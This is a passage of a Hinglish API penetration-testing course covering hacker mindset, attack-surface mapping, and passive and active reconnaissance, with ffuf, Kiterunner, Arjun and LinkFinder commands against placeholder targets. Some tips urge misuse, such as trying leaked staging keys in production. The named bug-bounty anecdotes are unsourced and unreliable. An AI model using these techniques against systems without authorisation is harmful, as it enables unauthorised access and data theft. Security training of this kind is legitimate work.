## 🧩 Module 0: API Hacking Mindset & Methodology

Is module mein hum API hacking ki **soch** aur **approach** seekhenge. Yeh foundation hai, agar ye clear nahi hoga, baaki sab bekaar hai.

---

### 0.1 🎯 Title: API vs Web App – Dono mein farak hai bhai!

#### 🐣 Samjhane ke liye (Analogy)
Socho tum ek **Dukaan (Web App)** mein gaye. Wahan ek salesman (UI) hai jo tumse baat karta hai, product dikhata hai, bill banata hai. Lekin agar tum **godown (API)** mein seedha ghus gaye, to salesman ko bypass kar ke stock check kar sakte ho, price change kar sakte ho, ya direct samaan nikal sakte ho. API exactly yahi hai – **bina UI ke backend se baat karne ka tareeka**.

#### 📖 Technical Definition
- **Web Application:** User Interface (HTML, CSS, JS) ke through interact karta hai. Requests browser se aati hain, responses render hote hain. 
- **API (Application Programming Interface):** Machine-to-machine communication. Direct backend se baat hoti hai, generally JSON/XML format mein. Koi UI nahi, sirf endpoints hote hain jo specific functions perform karte hain.

#### 🧠 Zaroorat Kyun Hai?
API testing mein humein UI ke jhanjhat se nahi ulajhna, seedha backend logic ko todna hai. Isliye API aur web app ka difference samjhe bina, API hacking mumkin nahi.

#### 🔍 Visual - Screen Par Kya Dikhega
- **Web App:** Browser mein URL type karo, ek page khulta hai, forms hain, buttons hain.
- **API:** Koi UI nahi. Tum tool (Burp, Postman) mein direct endpoint hit karoge aur raw JSON response dekhega.

#### ⚙️ Under the Hood
Web app request mein usually headers hote hain jaise `User-Agent`, `Cookie`, `Referer`, aur response mein HTML content. API request mein content-type `application/json` hota hai, authentication token `Authorization` header mein jaata hai, response structured data (JSON/XML) hota hai.

#### 💻 Hands-On Step-by-Step
1. **Burp Suite kholo** aur target site browse karo (web app mode).
2. **HTTP history** mein jakar kisi bhi request ko dekho.
3. Agar request ka response **HTML** hai, to wo web app hai. Agar response **JSON** array ya object hai, wo API endpoint hai.
4. Ab wahi request **Repeater** mein bhejo, aur `Accept` header ko `application/json` mein badal kar dekho – kabhi kabhi web app bhi JSON de deta hai, matlab woh API bhi expose kar raha hai.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Successful Exploit:** Tumne kisi web app form ke background mein API call identify kar li, aur direct API mein vulnerability find kar li.
- **Failure:** Tum web app ki UI vulnerabilities (XSS, etc.) mein phase rahe, aur API endpoints miss kar diye.

#### ⚖️ Comparison (X vs Y)

| Feature | Web Application | API |
|---------|----------------|-----|
| Interface | Browser UI | Direct HTTP calls |
| Data Format | HTML | JSON, XML |
| Authentication | Session cookies | Tokens (JWT, OAuth) |
| State | Usually stateful (sessions) | Usually stateless |
| Attacker Focus | Input validation, XSS, CSRF | Business logic, BOLA, Mass Assignment |

#### 🚫 Common Mistakes
- Beginners API ko bhi web app ki tarah treat karte hain, aur UI mein hi atke rehte hain.
- Har endpoint ko web app ke through hit karna, direct request modify karna bhoolna.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Par web app mein bhi toh API calls hoti hain?"** – Haan, lekin woh browser ke through hoti hain, tum unhe intercept kar ke direct API hit kar sakte ho. UI ke andar API chhupi hoti hai.

#### 🌍 Real-World Use Case
Ek bug bounty program mein target tha "example.com". Logo ne web app mein XSS dhundha, lekin ek hunter ne `example.com/api/v1/users` endpoint discover kiya jo bina auth ke saare users ka data leak kar raha tha. **API vs Web app** samajhne se fayda hua.

#### 🎨 Visual Diagram (ASCII Art)
```
Web App (Browser):
[User] -> [Browser] -> [Server]
         (UI ke saath)

API (Direct):
[Attacker] -> [Tool] -> [Server]
         (Bina UI ke, raw data)
```

#### 🛠️ Best Practices (Pro Tips)
- Har web app mein background API calls dhundho – Chrome DevTools ka Network tab kholo, XHR/Fetch requests dekho.
- Burp ke Target site map mein jakar, saare endpoints ko scope mein lao, aur unhe API ya web app classify karo.

#### ❓ FAQ
1. **Q: Web app ka bhi API testing karna hai kya?**  
   A: Haan, web app ke andar jo API calls ho rahi hain, woh bhi test karo.
2. **Q: Sirf JSON hi API hota hai?**  
   A: Nahi, XML, GraphQL, ya koi bhi structured data API ho sakta hai.
3. **Q: Agar API endpoint mil jaye, lekin kuch data na mile?**  
   A: Auth missing ho sakti hai, ya method galat ho sakta hai (GET vs POST).

#### 📝 Ek Line Mein Yaad Rakhne Ko
**API web app ka "backdoor" hai, jahan UI nahi, sirf logic hota hai.**

---

### 0.2 🎯 Title: Attack Surface Samjho – Har endpoint ek darwaza hai

#### 🐣 Samjhane ke liye (Analogy)
Socho ek building hai jiske kitne darwaze hain. Har darwaza (endpoint) alag room mein jaata hai. Kisi darwaze par lock hai (auth), kisi par nahi. Kuch darwaze andar ka raasta dikhate hain (GET), kuch naya saman daalne ke liye hain (POST), kuch purana saman nikalne ke liye (DELETE). Attack surface in sab darwazon ka collection hai jinme se tum andar ghus sakte ho.

#### 📖 Technical Definition
Attack surface ek API ke saare **endpoints**, unke **HTTP methods**, **parameters**, **headers**, aur **data formats** ka set hota hai jo attacker ke liye accessible hai. Ismein woh endpoints bhi shamil hain jo publicly documented nahi hain (shadow APIs).

#### 🧠 Zaroorat Kyun Hai?
Har endpoint ek potential vulnerability hai. Jaise building ke saare darwaze check kiye bina security claim nahi kar sakte, waise API ke saare endpoints test kiye bina uski security pakki nahi hoti.

#### 🔍 Visual - Screen Par Kya Dikhega
Burp Suite mein jab tum site map dekhte ho, to saare URLs list hote hain – `/api/users`, `/api/posts`, `/admin/api/health`, etc. Inhi ko attack surface kehte hain.

#### ⚙️ Under the Hood
API framework (jaise Express, Django REST) mein routes define hote hain. Har route ek function se mapped hota hai. Attack surface discovery ka matlab in routes ki mapping nikalna, chahe wo documented ho ya nahi.

#### 💻 Hands-On Step-by-Step
1. **Kiterunner (kr) tool use karo:**  
   `kr scan http://target.com/api -w api_words.txt`  
   Ye tool common API endpoints ki wordlist se fuzzing karega aur jo bhi exist karta hai wo batayega.
2. **Swagger UI dhundho:**  
   `/swagger`, `/api/docs`, `/v2/api-docs` jaise paths try karo. Agar mil gaya to automatically saare endpoints ka pata chal jayega.
3. **Burp Passive Scan:**  
   Burp ko passive scan mode mein rakho, jab tum web app browse kar rahe ho, wo background mein API endpoints collect karta rahega.
4. **Wayback Machine / Gau:**  
   `gau target.com` se purane archived URLs nikaalo, jinme hidden endpoints ho sakte hain.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Tumhe koi aisa endpoint mil gaya jo documentation mein nahi tha (shadow API) aur uspar vulnerability hai.
- **Failure:** Sirf documented endpoints tak simit rahe, shadow APIs miss kar diye.

#### ⚖️ Comparison (X vs Y)
| Concept | Documented API | Shadow API |
|---------|----------------|------------|
| Access | Publicly available | Hidden, no docs |
| Security | Usually tested | Often forgotten, more vulnerable |
| Discovery | Easy (Google, docs) | Hard (fuzzing, recon) |

#### 🚫 Common Mistakes
- Sirf Swagger milne par khush ho jana, aur baaki endpoints miss karna.
- Fuzzing nahi karna, sirf manual enumeration karna.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Bahut saare endpoints mil gaye, sab test kaise karun?"** – Prioritize karo: sensitive data wale endpoints (users, admin) pehle test karo, aur easily guessable endpoints (test, dev) bhi check karo.

#### 🌍 Real-World Use Case
Paytm ke bug bounty mein ek researcher ne `/v1/payments/internal` endpoint fuzz kiya, jo internal use ke liye tha aur bina auth ke access tha. Isse woh kisi bhi user ka balance change kar sakta tha. Shadow API discovery ne bounty dilwaya.

#### 🎨 Visual Diagram (ASCII Art)
```
Target API
  ├── /api/public (documented)
  ├── /api/private (auth required)
  ├── /internal/health (shadow)
  ├── /swagger (documentation)
  └── /backup/api (shadow)
```

#### 🛠️ Best Practices (Pro Tips)
- Wordlist use karo jo specifically API endpoints ke liye bani ho (assetnote, kiterunner ki).
- Directory brute-force ke saath saath, parameter fuzzing bhi karo: `/api/users?uid=1`, `/api/users/1` dono try karo.

#### ❓ FAQ
1. **Q: Attack surface discovery ke liye kaunsa tool best hai?**  
   A: Kiterunner fast hai, Burp Intruder bhi use kar sakte ho, aur Gau passive recon ke liye.
2. **Q: Shadow API kya hota hai?**  
   A: Jo API publicly document nahi hui, lekin accessible hai – jaane-anjaane mein developer ne chhod di.
3. **Q: Agar endpoint mil gaya lekin 403 aata hai?**  
   A: Authentication bypass try karo, ya method change karo (GET to POST), ya headers manipulate karo.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**Har endpoint ek darwaza hai, chahe lock ho ya na ho, check toh karna hi padega.**

---

### 0.3 🎯 Title: Rule #1 – Kabhi bhi server ke response par bharosa mat karo

#### 🐣 Samjhane ke liye (Analogy)
Maano tumne kisi se udhaar manga aur usne kaha "Mere paas paisa nahi hai". Tumne maan liya. Lekin uski jeb mein 500 rupaye the. Tumne bharosa kar liya, galat kiya. Waise hi, server "Error" dikha raha hai, lekin ho sakta hai andar operation ho gaya ho. Kabhi bhi sirf response dekh kar mat maano ki kaam hua ya nahi.

#### 📖 Technical Definition
Rule #1: **Never trust the server's response blindly.** Sirf HTTP status code ya response message ko final proof mat samjho. Hamesha real-world impact check karo. Jaise 200 OK aaya, to automatic success nahi; 403 Forbidden aaya, to automatic failure nahi. Ho sakta hai server ne 403 dikhaya, lekin database mein changes ho gaye.

#### 🧠 Zaroorat Kyun Hai?
API testing mein hum server ko confuse kar rahe hote hain. Kabhi kabhi server error message dekar bhi request process kar deta hai (race conditions, logic flaws). Agar hum response par bharosa kar lenge, to vulnerability miss ho jayegi.

#### 🔍 Visual - Screen Par Kya Dikhega
Burp Repeater mein request bheji, response aaya "403 Forbidden". Par agar tum database check karoge (agar access ho), ya kisi aur user se confirm karoge, to pata chalega ki record delete ho gaya. Response ne jhooth bola.

#### ⚙️ Under the Hood
Server-side validation mein kabhi kabhi "fail-open" condition hoti hai. Jaise, authorization fail hone par bhi database operation commit ho jata hai, lekin server 403 return kar deta hai. Ya error handling theek nahi hai, to operation to ho jata hai lekin response galat aata hai.

#### 💻 Hands-On Step-by-Step
1. Kisi bhi endpoint par request bhejo jisme tum authorization bypass kar rahe ho (e.g., IDOR attempt).
2. Response check karo – 403 aaya.
3. Ab tum kisi aur tarah se verify karo ki operation hua ya nahi. Jaise kisi aur user se pucho ki uski profile delete hui ya nahi, ya kisi aur endpoint se data check karo.
4. Agar operation ho gaya, to vulnerability hai, chahe response kuch bhi ho.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Successful Exploit:** Response 403 aaya, lekin data delete ho gaya – vulnerability found.
- **Failure:** Tumne 403 dekh kar assume kar liya ki "kuch nahi hua" aur aage badh gaye – vulnerability miss.

#### ⚖️ Comparison (X vs Y)
| Situation | Response | Actual Impact | Conclusion |
|-----------|----------|---------------|------------|
| Normal | 200 OK | Data changed | Expected |
| Vulnerable | 403 Forbidden | Data changed | Vulnerability |
| Vulnerable | 200 OK | Data unchanged? | Maybe false positive? |
| Secure | 403 Forbidden | Data unchanged | Secure |

#### 🚫 Common Mistakes
- Beginners 200 OK dekh kar happy ho jate hain, aur 403 dekh kar ignore kar dete hain.
- Response body mein "error" ya "success" flags par bharosa karna.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Par agar response 403 aaya to kaise pata chale ki operation hua?"** – Indirect methods use karo: jaise user activity logs, duplicate requests se trigger, ya kisi aur API se verify.

#### 🌍 Real-World Use Case
Ek pentest mein, tester ne password change API mein CSRF token bypass kiya. Request bheji, response 403 aaya. Lekin user ke password actually change ho gaye. Server ne 403 dekar attacker ko confuse kiya, lekin impact tha.

#### 🛠️ Best Practices (Pro Tips)
- Response ke saath-saath, second-order effects check karo. Jaise profile update API 200 de rahi hai, lekin profile view API mein changes nazar aa rahe hain? Toh kaam hua.
- Race conditions mein to ye rule aur bhi important hai.

#### ❓ FAQ
1. **Q: Har response ko kaise verify karun?**  
   A: Jitna ho sake, out-of-band ya parallel checks karo. Jaise email trigger ho raha hai? Database entry ban rahi hai?
2. **Q: Agar verify karne ka koi tarika na ho?**  
   A: Toh bhi response ko grain of salt ke saath lo. Multiple requests bhej kar pattern dekho.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**Server jhooth bol sakta hai, uski baaton mein mat aao – asliyat check karo.**

---

### 0.4 🎯 Title: Rule #2 – API Testing = Logic Testing

#### 🐣 Samjhane ke liye (Analogy)
Ek ghar mein chor ghusna chahta hai. Web app testing hai ki darwaza kitna majboot hai, lock kaise todna hai. API testing hai ki ghar ka layout kaisa hai, kaunsa darwaza kitchen mein jaata hai, kaunsa bedroom mein, aur kitchen ke darwaze se bedroom mein kaise pahunch sakte ho. **Logic testing** matlab flows ko todna, ordering mein gadbadi karna, parameters ki mapping galat karna.

#### 📖 Technical Definition
API testing asal mein **business logic testing** hai. Iska matlab hai ki API ke intended functionality ko examine karo, aur dekho ki usko kahan tod sakte ho – jaise kisi ko do baar refund kar dena, kisi aur ka order cancel kar dena, discount ek se zyada baar apply kar dena.

#### 🧠 Zaroorat Kyun Hai?
Technical vulnerabilities (SQLi, XSS) toh automated tools bhi dhundh lete hain. Lekin business logic flaws sirf humans dhundh sakte hain. Inhi flaws se sabse bada impact hota hai (financial loss, data breach).

#### 🔍 Visual - Screen Par Kya Dikhega
Burp mein ek request sequence capture karo:  
1. User login -> Add to cart -> Apply coupon -> Checkout -> Payment -> Order confirmation.  
Ab tum dekho ki kya tum coupon apply karne ke baad cart mein items add kar sakte ho, jisse coupon un items par bhi apply ho jaye (logic flaw).

#### ⚙️ Under the Hood
Har API call ek state change karta hai. Backend mein ek process flow hota hai. Logic flaw tab aata hai jab ye flow expected order mein nahi hota, ya steps skip ho sakte hain, ya conditions properly check nahi hoti.

#### 💻 Hands-On Step-by-Step
1. **Functional flow samjho:** Pehle application ko normally use karo, har step ka request note karo.
2. **Sequence break karo:** Kisi step ko skip kar ke agla step try karo. Jaise payment ke bina order confirm kar do.
3. **Parameters manipulate karo:** Kisi step mein jo parameter auto-calculated hai (jaise total price), usko modify kar ke bhejo.
4. **Race condition try karo:** Ek hi resource par do parallel requests bhejo, jaise ek hi coupon do baar apply kar do.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Tumne kisi step ko bypass kar ke directly confirmation generate kar li, ya ek se zyada baar discount le liya.
- **Failure:** Tumne har step properly follow kiya, koi flaw nahi mila.

#### ⚖️ Comparison (X vs Y)
| Flaw Type | Example | Impact |
|-----------|---------|--------|
| Technical | SQLi in id parameter | Data leak |
| Logic | Order after payment bypass | Free product |

#### 🚫 Common Mistakes
- Sirf OWASP Top 10 technical flaws par focus karna, business logic ko ignore karna.
- Application ko normal user ki tarah use karna, na ki hacker ki tarah.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Business logic samajhna mushkil hai, kaise pata chale ki kya todna hai?"** – Developers ki tarah socho. Agar tum developer hote to kaise implement karte? Us implementation mein loopholes dhundho.

#### 🌍 Real-World Use Case
Uber mein ek flaw tha: Ride complete hone ke baad fare calculate hota tha. Tester ne ride cancel kar di, lekin fare calculate ho gaya, aur usse refund mil gaya. Phir usne same ride ko complete kiya, aur doosra fare calculate hua. Logic flaw tha ki cancellation ke baad fare state reset nahi hua.

#### 🛠️ Best Practices (Pro Tips)
- **Mind map banao:** Har feature ke steps ka diagram banao, aur har step par "what if" socho.
- **Turbo Intruder use karo** race conditions ke liye.
- **Multi-step workflows** ko ek saath test karo, alag-alag nahi.

#### ❓ FAQ
1. **Q: Logic testing ke liye koi tool hai?**  
   A: Tool nahi, dimaag chahiye. Burp bas requests capture karta hai, logic tumhe sochna hai.
2. **Q: Kaise pata chale ki koi logic flaw hai?**  
   A: Jab tum socho ki "aisa nahi hona chahiye" aur woh ho jaye.
3. **Q: Sabse common logic flaw?**  
   A: Race conditions aur parameter manipulation.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**API todna hai toh uska logic samjho, technical flaws toh side mein hain.**

---

## 🔥 Module 0 Summary: API Hacking Mindset in 4 Points
1. **API vs Web App:** UI ke piche chhupi API dhundho.
2. **Attack Surface:** Har endpoint, har method scan karo.
3. **Rule #1:** Server ke response ko kabhi trust mat karo.
4. **Rule #2:** Technical se zyada logic flaws par dhyan do.

Yeh mindset lekar aage badho, ab Modules 1 se 8 mein asli maza ayega. Agla module chahiye toh batao! 🚀

========================================================================================

## 🔍 Module 1: Reconnaissance & Advanced Discovery
*Target ki "Jaikaashi" karna. Jitna jaayega jaanoge, utna deep jaayega exploit.*

**Welcome Mentor ji!** Ab hum shuru karte hain API hacking ka pehla aur sabse important phase – **Reconnaissance**. Is module ko padhne ke baad, aap kisi bhi target ki "naak, nose, brain" sab pata kar sakoge bina trigger kiye ya directly map karke.

---

### Topic 1.1: Passive Recon (Bina Touch Kiye)
*Jaise chor ghar mein ghusne se pehle bahar se hi windows count karta hai, kaunsi light on hai, kaunsi off – waise hi hum bina kisi request bheje target ke baare mein jaankari ikattha karte hain.*

#### 🐣 Samjhane ke liye (Analogy)
Maano tum kisi ladki ko impress karna chahte ho. Pehle tum uske Facebook, Instagram, LinkedIn dekhte ho bina usse message kiye. Dekhte ho ki uski photo kahan ki hai, kya pasand hai, kahan job karti hai. Ye sab **Passive Recon** hai. Tumne usse touch nahi kiya, lekin uske baare mein bahut kuch jaan liya.

#### 📖 Technical Definition
Passive Reconnaissance ka matlab hai target ke saath **direct interaction kiye bina** (bina kisi HTTP request bheje) maximum information collect karna. Ismein hum OSINT (Open Source Intelligence) tools aur techniques use karte hain.

#### 🧠 Zaroorat Kyun Hai?
- **Stealth:** Target ko pata nahi chalega ki hum test kar rahe hain. Isliye bug bounty mein passive recon pehle karte hain, taaki WAF block na kare.
- **Surface Mapping:** JS files, third-party services, tech stack se hume endpoints ka andaaza ho jata hai ki kahan active recon karna hai.

#### 🔍 Visual - Screen Par Kya Dikhega
- **Wappalyzer:** Browser extension install karo. Kisi bhi website par jao, extension icon click karo – ek popup aayega jisme likha hoga: "Framework: React", "Web Server: Nginx", "Database: MongoDB". (Reference: **Page 12**)
- **BuiltWith:** `builtwith.com` par target domain daalo – ek detailed report milega, jismein hosting provider, analytics tools, CDN sab kuch.
- **Browser DevTools:** Right-click -> Inspect -> Sources tab. Yahan saari JS files list hongi. Koi file kholo, usmein `/api`, `api-key` search karo.

#### ⚙️ Under the Hood
- **Wappalyzer/BuiltWith:** Ye tools target ke HTTP response headers (jaise `Server`, `X-Powered-By`) aur HTML content mein specific patterns dhundhte hain. Jaise agar `wp-content` dikha to WordPress samajhte hain.
- **JS Mining:** Jab browser JS file download karta hai, toh us file ke andar strings hote hain. Developers kabhi kabhi endpoints ya keys comments mein daal dete hain. Minified code (without spaces) ko beautify karne se readable ho jata hai.

#### 💻 Hands-On Step-by-Step
**Step 1: Tech Stack Detection (Wappalyzer)**
1. Chrome ya Firefox mein **Wappalyzer** extension add karo.
2. Target site kholo, jaise `https://target.com`.
3. Extension icon click karo – list dekho:
   - **JavaScript Frameworks:** React, Vue, Angular (matlab Single Page Application, API calls zyada hongi).
   - **Web Servers:** Nginx, Apache.
   - **Databases:** MySQL, MongoDB (MongoDB hai toh NoSQLi try karna).
4. **BuiltWith** par bhi domain daal kar confirm karo.

**Step 2: Source Code Analysis (JS Mining) – (Reference: Page 6)**
1. Target site par right-click -> **Inspect** ya `Ctrl+Shift+I`.
2. **Sources (Debugger)** tab par jao.
3. Left sidebar mein saari `.js` files dikhengi. Har file par click karo.
4. Agar code minified hai (ek line mein sab kuch), toh us code ko copy karo aur **"JavaScript JS Formatter"** (jaune `beautifier.io`) mein paste karo.
5. Ab beautified code mein `Ctrl+F` karke dhoondo:
   - `/api` – kya koi endpoint dikh raha hai?
   - `swagger` – `/swagger-ui.html` mil sakta hai?
   - `graphql` – introspection endpoint ka clue?
   - `key`, `secret`, `token` – hardcoded credentials?
6. **Pro Tip:** Manual search ke alawa, **LinkFinder** tool use karo:
   - Install: `pip install linkfinder`
   - Command: `python linkfinder.py -i https://target.com -o cli`
   - Ye automatically saari JS files se endpoints nikal dega.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Aapko koi aisa endpoint mila jo documentation mein nahi tha, jaise `/internal/api/v3/users`. Ya koi hardcoded API key mili.
- **Failure:** Sirf homepage dekha, JS files ignore kar di, koi valuable info nahi mili.

#### ⚖️ Comparison (X vs Y)
| Technique | Wappalyzer | JS Mining |
|-----------|------------|-----------|
| Input | URL | JS files |
| Output | Tech stack (server, framework) | Hidden endpoints, keys |
| Difficulty | Easy | Moderate |
| Automation | Extension | Tools (LinkFinder) |

#### 🚫 Common Mistakes
- Sirf Wappalyzer par bharosa karke active recon shuru kar dena, JS files na dekhna.
- Minified code ko bypass karna, "yeh toh padhte nahi" kehkar.
- Hardcoded keys ko ignore karna, "demo key hoga" samajhna.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"JS files mein endpoints mil gaye, lekin wo sahi hain kaise pata chalega?"** – Kuch endpoints relative hote hain (`/api/user`), kuch absolute (`https://api.target.com`). Unhe Burp ya browser console mein hit kar ke dekho. 401 aaya toh auth chahiye, 200 aaya toh open hai.
- **"BuiltWith aur Wappalyzer alag kyun dikha rahe?"** – BuiltWith deep DNS records aur third-party services bhi scan karta hai, Wappalyzer sirf frontend response se kaam karta hai.

#### 🌍 Real-World Use Case
Ek bug bounty hunter ne `target.com` ki JS files mein `window.API_KEY = "AIzaSy..."` dekha. Ye Google API key tha. Usne woh key use karke Google Cloud services access kar li, aur sensitive data leak kar diya. **JS Mining** ne bounty dilwaya.

#### 🛠️ Best Practices (Pro Tips)
- **Burp Suite Passive Scanner** on rakho – jab tum web app browse kar rahe ho, wo background mein JS files scan karega aur endpoints collect karega.
- **JS files ke saath saath, source maps (.map)** bhi dekho. Kabhi kabhi original source code mil jata hai.
- **Wayback Machine** (archive.org) par target dhundho – purani JS files mein zyada secrets hote hain.

#### ❓ FAQ
1. **Q: Wappalyzer se pata chala ki site React par bani hai. Isse kya fayda?**  
   A: React SPAs mein API calls frontend se hoti hain, isliye JS files mein endpoints milne ke chances zyada hain.
2. **Q: JS files mein API key mili, lekin wo invalid hai?**  
   A: Kabhi kabhi wo staging environment ki key hoti hai. Phir bhi usse production mein try karo, kuch na kuch milta hai.
3. **Q: BuiltWith ke liye paise dene padte hain?**  
   A: Free version kaafi hai basic recon ke liye.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**Passive recon mein target ko touch mat karo, uski JS files aur tech stack se sab pata karo.**

---

### Topic 1.2: Active Recon (Mapping the Territory)
*Ab hum darwaza khatkhatayenge, lekin dheere se, taaki pata chal jaye ki andar kaun hai.*

#### 🐣 Samjhane ke liye (Analogy)
Passive recon ke baad, tum ladki ke baare mein thoda jaante ho. Ab tum uski friend list dekhte ho, uske photos par likes count karte ho, lekin abhi tak message nahi kiya. **Active recon** hai usse ek "Hi" bhejna aur dekna ki wo reply karti hai ya nahi, kaise karti hai. Yahan hum target server ko directly request bhejte hain.

#### 📖 Technical Definition
Active Recon mein hum target API endpoints par **legitimate ya malformed requests bhej kar** unke response analyze karte hain. Isse hume pata chalta hai ki kaunse endpoints exist karte hain, kaunse parameters accepted hain, aur authentication kaise kaam karta hai.

#### 🧠 Zaroorat Kyun Hai?
- **Discovery:** Passive recon mein jo endpoints nahi mile, wo active fuzzing se mil jayenge.
- **Validation:** Jo endpoints mile, wo actually exist karte hain ya nahi, ye confirm hota hai.
- **Behavior Analysis:** API ka behavior kaise change hota hai different inputs se, ye pata chalta hai.

#### 🔍 Visual - Screen Par Kya Dikhega
- **Kiterunner Terminal:** `kr scan http://target.com/api -w api_words.txt` chalane par terminal mein responses flood honge. `[200] /api/users`, `[403] /api/admin`, `[404] /api/xyz`.
- **Burp Param Miner:** Extension install karo, kisi endpoint par right-click -> "Guess params". Neche ek tab khulega jisme "Discovered params" dikhenge.

#### ⚙️ Under the Hood
- **Directory Fuzzing:** Tool wordlist ki har entry ko base URL ke saath jod kar request bhejta hai. Response status code dekhta hai. 200/403/500 matlab endpoint exist karta hai, 404 matlab nahi.
- **Kiterunner (kr):** Ye normal fuzzer se alag hai. Ye API routes ko samajhta hai. Jaise `/api/users/:id` format mein ye `:id` ko wildcard maan kar fuzzing karta hai aur common IDs (1,2,3, admin, etc.) try karta hai.
- **Param Miner:** Ye hidden parameters dhundhta hai. Jaise kisi endpoint par `id` parameter accept ho raha hai, toh ye `admin`, `debug`, `test` jaise common hidden params try karega.

#### 💻 Hands-On Step-by-Step
**Step 1: Directory/File Fuzzing (Basic) with ffuf**
1. `ffuf` install karo (ya `gobuster`).
2. Command:  
   `ffuf -u https://target.com/api/FUZZ -w /path/to/api-wordlist.txt -ac`
   - `-ac` auto-calibrate karta hai, 404 responses filter karne ke liye.
3. Wordlist mein `users`, `admin`, `v1`, `swagger`, `graphql`, `health` jaise words hote hain.
4. Output dekho: `[Status: 200] /api/users` matlab mil gaya.

**Step 2: API-Specific Fuzzing (Advanced) with Kiterunner (Reference: Page 6)**
1. Kiterunner download karo (`github.com/assetnote/kiterunner`).
2. Command:  
   `kr scan https://target.com/api -w /path/to/assetnote-api-words`
3. Ye tool pehle routes fuzzing karega, phir common IDs aur parameters try karega.
4. Example output:  
   `[200] GET /api/users/1` – user 1 exist karta hai.  
   `[403] GET /api/admin` – admin endpoint exist karta hai par auth chahiye.

**Step 3: Hidden Parameter Discovery with Arjun**
1. Arjun install karo: `pip install arjun`
2. Command:  
   `arjun -u https://target.com/api/users -m GET`
3. Arjun common parameter wordlist lekar har parameter try karega aur response mein difference dekhega.
4. Output: `{"id": "1", "admin": "true"}` – matlab `admin` hidden parameter accept ho raha hai.

**Step 4: Documentation Mining (Sone ki chidiya)**
1. Burp Suite mein target site browse karo.
2. In URLs manually ya intruder se try karo:
   - `/swagger-ui.html`
   - `/swagger.json`
   - `/v2/api-docs`
   - `/openapi.json`
   - `/redoc`
   - `/graphql?introspection`
3. Agar `200 OK` mila aur JSON/HTML docs dikhe, toh poora API ka map mil gaya.

**Step 5: Improper Assets Management – Shadow APIs**
1. Assume karo ki current version `/v2/` hai. Lekin `/v1.1/`, `/v3-beta/`, `/internal/` bhi ho sakte hain.
2. Fuzzing mein `v1`, `v2`, `v3`, `internal`, `test`, `dev`, `staging` jaise words add karo.
3. Agar `/v1/` par 200 aaya, toh shadow API mil gaya.

**Step 6: Environment Leakage**
1. Kisi request mein `Host` header change karo:  
   Original: `Host: api.target.com`  
   Modified: `Host: dev-api.target.com`
2. Dekho kya response aata hai. Agar data mila, toh environment leakage hai.
3. Ya parameters mein `env=prod` ko `env=dev` karo.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Koi aisa endpoint mila jo documentation mein nahi tha, aur wo sensitive data leak kar raha hai.
- **Failure:** Sirf documented endpoints mile, koi hidden ya shadow API nahi mila.

#### ⚖️ Comparison (X vs Y)
| Tool | Use Case | Advantage |
|------|----------|-----------|
| ffuf | Directory/File fuzzing | Fast, flexible |
| Kiterunner | API route fuzzing | Context-aware, API-specific |
| Arjun | Parameter discovery | Finds hidden params |
| Param Miner | Burp extension | Integrates with Burp |

#### 🚫 Common Mistakes
- Sirf `200 OK` ko success samajhna, `403` ko ignore karna. `403` matlab endpoint exist karta hai, lekin auth hai – baad mein bypass try karo.
- Fuzzing mein default wordlists use karna (jaise directory-list-2.3-medium) – ye API ke liye ineffective hain. API-specific wordlists use karo (assetnote, kiterunner ki).
- Swagger milne par happy ho jana aur aage fuzzing nahi karna.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Fuzzing se bahut saare 403 mile, unka kya karun?"** – Un endpoints ko note karo. Baad mein authentication bypass techniques lagao (JWT manipulation, header injection).
- **"Shadow API mila, lekin data nahi mil raha?"** – Method change karo (GET to POST), headers add karo, ya authentication tokens try karo.

#### 🌍 Real-World Use Case
Ek researcher ne `api.instagram.com` par Kiterunner chalaya. Use `/api/v1/feed/internal` mila, jo shadow API tha. Usne request bheji toh saare users ki private posts leak ho rahi thi. **API-specific fuzzing** ne $10,000 ka bounty dilwaya.

#### 🛠️ Best Practices (Pro Tips)
- **Rate limiting** ka dhyan rakho. Fuzzing mein `-t` (threads) kam rakho (5-10) taaki block na ho.
- **Wordlists:** Assetnote ki API wordlist best hai. Github se download karo.
- **Burp Intruder** mein `sniper` attack use karo clusterbomb se pehle, taahi basic fuzzing karo.

#### ❓ FAQ
1. **Q: Kiterunner aur ffuf mein kya difference hai?**  
   A: ffuf general purpose fuzzer hai, Kiterunner specifically API routes ke liye design hua hai aur common ID fuzzing bhi karta hai.
2. **Q: Shadow API ka pata chal gaya, lekin authentication bypass kaise karun?**  
   A: Module 2 (Auth) mein padhenge.
3. **Q: Swagger UI mil gaya, lekin wo blank hai?**  
   A: Kabhi kabhi Swagger JSON alag endpoint par hota hai (`/swagger.json`). Use dhundho.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**Active recon mein tools se fuzzing karo, hidden endpoints aur parameters dhundho, aur Swagger mila toh lottery lag gaya.**

---

### Topic 1.3: Version Control & Leak Search
*Developer ki galtiyan – kabhi kabhi code ke saath keys bhi commit ho jati hain.*

#### 🐣 Samjhane ke liye (Analogy)
Tumhari girlfriend ne tumhe apni diary padhne di. Usme usne likha tha ki "Mera password meri birthday hai". Diwali par usne woh page phaad kar phenk diya, lekin nishaan reh gaya. Waise hi, developers kabhi kabhi code ke saath sensitive info commit kar dete hain, aur baad mein delete bhi kar dete hain, lekin Git history mein reh jata hai.

#### 📖 Technical Definition
Version control systems (Git) par kabhi kabhi accidentally API keys, tokens, credentials commit ho jate hain. Public repositories (GitHub, GitLab) mein ye dhundhna possible hai. Mobile apps decompile karne par bhi hardcoded keys milti hain.

#### 🧠 Zaroorat Kyun Hai?
- **Direct Access:** API key mil gayi toh authentication bypass kar sakte ho.
- **Internal Docs:** Kabhi kabhi internal endpoints aur architecture details mil jate hain.

